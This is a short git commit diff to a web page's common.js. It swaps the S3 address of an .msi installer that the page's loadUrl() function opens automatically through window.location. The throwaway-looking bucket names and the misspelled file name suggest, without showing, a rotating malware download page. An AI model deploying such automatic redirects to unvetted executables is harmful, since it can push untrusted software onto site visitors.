7f8a7fb81d63d4cd3a4c1267dd64c21e460f413c
siwaza <brucelook2025@outlook.com>
2025-06-25 17:00:19 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hw625.s3.ap-southeast-2.amazonaws.com/HelloWorld_x64.msi";
+		var url="https://hh036.s3.ap-southeast-2.amazonaws.com/HelloWorld_Steup_Srs.msi";
 		window.location=url;
 	}
 }
